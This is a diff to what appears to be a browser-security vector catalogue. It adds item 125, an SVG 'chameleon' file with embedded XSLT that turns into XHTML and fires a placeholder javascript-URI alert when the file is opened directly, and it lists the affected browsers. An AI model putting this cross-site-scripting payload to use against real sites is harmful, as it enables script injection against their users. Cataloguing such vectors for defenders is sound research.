@@ -4264,11 +4264,11 @@ var items =
         'tags'       : ['clickjacking', 'classjacking', 'jQuery', 'class'],
         'reporter'   : 'mniemietz'
     },
-    { /* ID 124 - backslashes alternative to slash */
+    { /* ID 124 - Backslashes as alternative to slashes on Webkit */
         'id'        : 124,
         'category'  : 'html',
         'name'      : {
-            'en'    : 'backslashes alternative to slash ',
+            'en'    : 'Backslashes as alternative to slashes on Webkit',
             'ja'    : '\u30b9\u30e9\u30c3\u30b7\u30e5\u306e\u304b\u308f\u308a\u306e\u5186\u8a18\u53f7\u0028\u30d0\u30c3\u30af\u30b9\u30e9\u30c3\u30b7\u30e5\u0029',
             'ru'    : '',
             'cs'    : '',
@@ -4296,5 +4296,38 @@ var items =
         },
         'tags'      : [ 'html', 'dom' ],
         'reporter'  : 'hasegawayosuke'
-    }
+    },
+    { /* ID 125 - SVG chameleon behavior via embedded XSLT */
+        'id'        : 125,
+        'category'  : 'html',
+        'name'      : {
+            'en'    : 'SVG chameleon behavior via embedded XSLT',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'data'      : '<?xml version="1.0"?>\r\n<?xml-stylesheet type="text/xml" href="#stylesheet"?>\r\n<!DOCTYPE doc [\r\n<!ATTLIST xsl:stylesheet\r\n\r\n  id	ID	#REQUIRED>]>\r\n<svg xmlns="http://www.w3.org/2000/svg">\r\n	<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\r\n		<xsl:template match="/">\r\n			<iframe xmlns="http://www.w3.org/1999/xhtml" src="%js_uri_alert%"></iframe>\r\n		</xsl:template>\r\n	</xsl:stylesheet>\r\n	<circle fill="red" r="40"></circle>\r\n</svg>',
+        'description' : {
+            'en'    : 'This SVG chameleon file can be embedded via <embed> on most, and via <img> on most modern browsers. Thanks to the embedded XSLT stylesheet, it will change it\'s appearance, depending on how it is embedded or displayed. In an <img> or <embed> tag it just shows a red dot. But opened directly or via an <iframe>, the XSLT turns all SVG into (X)HTML and an alert will show. While most modern browsers show this behavior, Opera will completely mess it up, and show an alert when used via <embed> and an <iframe> when used via <img> (!). Chrome will show a broken image and an alert.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'urls'      : ['http://www.w3.org/Graphics/SVG/', 'http://www.w3.org/TR/xslt', 'http://www.dpawson.co.uk/xsl/sect2/onefile.html'],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'browsers'  : {
+			'internet explorer': ['9.0'],
+            'firefox': [ '3.x', '4.0' ]
+        },
+        'tags'      : [ 'svg', 'html', 'chameleon', 'xslt', 'embedded', 'xss'],
+        'reporter'  : '.mario'
+    }	
 ]
